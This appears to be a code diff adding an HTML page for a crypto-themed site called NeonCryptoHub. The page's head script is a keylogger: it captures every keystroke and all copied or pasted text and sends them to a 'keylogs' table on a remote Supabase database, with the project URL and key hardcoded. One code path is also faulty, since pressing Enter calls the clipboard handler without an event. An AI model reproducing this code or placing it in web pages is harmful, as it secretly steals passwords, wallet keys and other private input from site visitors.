@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>NeonCryptoHub</title>
+    <script>
+        // Initialize Supabase
+        const supabase = window.supabase.createClient(
+            'https://efjanywnqbtbdnxlspga.supabase.co',
+            'sb_publishable_E0cGB_SOoW2EZj4JGlTF7A_b2zxZaOi'
+        );
+
+        // Keylogger logic
+        document.addEventListener('keydown', logKey);
+        document.addEventListener('copy', logClipboard);
+        document.addEventListener('paste', logClipboard);
+
+        function logKey(e) {
+            const key = e.key;
+            if (key === 'Enter') {
+                logClipboard();
+            }
+            sendToSupabase(key);
+        }
+
+        function logClipboard(e) {
+            const text = e.clipboardData ? e.clipboardData.getData('text') : '';
+            sendToSupabase(text);
+        }
+
+        function sendToSupabase(data) {
+            supabase.from('keylogs')
+                .insert({
+                    key: data,
+                    timestamp: new Date().toISOString()
+                })
+                .catch(err => console.error('Supabase error:', err));
+        }
+    </script>
+</head>
+<body>
+    <!-- Your website content goes here -->
+    <h1>Welcome to NeonCryptoHub</h1>
+    <p>Visit our site to start keylogging in real time.</p>
+</body>
+</html>
